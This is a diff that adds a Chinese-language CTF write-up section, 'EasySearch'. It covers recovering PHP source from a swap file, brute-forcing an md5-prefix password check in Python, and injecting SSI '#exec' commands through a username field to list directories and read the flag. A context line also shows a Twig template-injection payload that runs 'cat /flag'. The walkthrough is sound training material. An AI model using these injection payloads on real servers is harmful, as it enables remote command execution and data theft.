@@ -174,3 +174,99 @@ function getFlag(){
 ```url
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
 ```
+
+### EasySearch
+
+通过 dirsearch 可以发现 `index.php` 的源码，在 `index.php.swp` 中。
+
+```php
+<?php
+	ob_start();
+	function get_hash(){
+		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
+		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
+		$content = uniqid().$random;
+		return sha1($content); 
+	}
+    header("Content-Type: text/html;charset=utf-8");
+	***
+    if(isset($_POST['username']) and $_POST['username'] != '' )
+    {
+        $admin = '6d0bc1';
+        if ( $admin == substr(md5($_POST['password']),0,6)) {
+            echo "<script>alert('[+] Welcome to manage system')</script>";
+            $file_shtml = "public/".get_hash().".shtml";
+            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
+            $text = '
+            ***
+            ***
+            <h1>Hello,'.$_POST['username'].'</h1>
+            ***
+			***';
+            fwrite($shtml,$text);
+            fclose($shtml);
+            ***
+			echo "[!] Header  error ...";
+        } else {
+            echo "<script>alert('[!] Failed')</script>";
+            
+    }else
+    {
+	***
+    }
+	***
+?>
+```
+
+首先需要进行 md5 前六位爆破，编写 Python 代码如下。
+
+```python
+import hashlib
+
+for i in range(10000000):
+    md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()
+    if md5[0:6] == "6d0bc1":
+        print(i, md5)
+
+# 2020666 6d0bc1153791aa2b4e18b4f344f26ab4
+# 2305004 6d0bc1ec71a9b814677b85e3ac9c3d40
+# 9162671 6d0bc11ea877b37d694b38ba8a45b19c
+```
+
+通过百度 `.shtml` 可以发现该类型文件是包含有嵌入式服务器方包含（SSI）命令的HTML网页文件。在被传送给用户浏览器之前，服务器会对SHTML文档进行完全地读取、分析以及修改，最后输出静态的网页。因此可以通过控制该文件内容从而执行系统命令获取 flag 。
+
+SSI主要有以下几种用途：
+
+* 显示服务器端环境变量<#echo>
+* 将文本内容直接插入到文档中<#include>
+* 显示WEB文档相关信息<#flastmod #fsize>（如文件制作日期/大小等）
+* 直接执行服务器上的各种程序<#exec>（如CGI或其他可执行程序）
+* 设置SSI信息显示格式<#config>（如文件制作日期/大小显示方式）高级SSI可设置变量使用if条件语句。
+
+通过构造 Payload 如下
+
+```
+username=<!--%23exec+cmd%3d"ls+/"+-->&password=2020666
+```
+
+可以在 Header 得到回显如下
+
+```
+Url_is_here: public/8b604896776b2fcee4eaf665d3ba30e4fc2b96f8.shtml
+```
+
+通过访问即可得到以下内容
+
+```
+Hello,bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+
+data: Monday, 22-Jan-2024 13:26:40 UTC
+
+Client IP: xxx.xxx.xxx.xxx
+```
+
+发现 flag 并不在这，尝试其他目录，可以找到 flag 在上级目录中，通过构造 Payload 如下即可得到 flag 。
+
+```
+username=<!--%23exec+cmd%3d"cat+../flag_990c66bf85a09c664f0b6741840499b2"+-->&password=2020666
+```
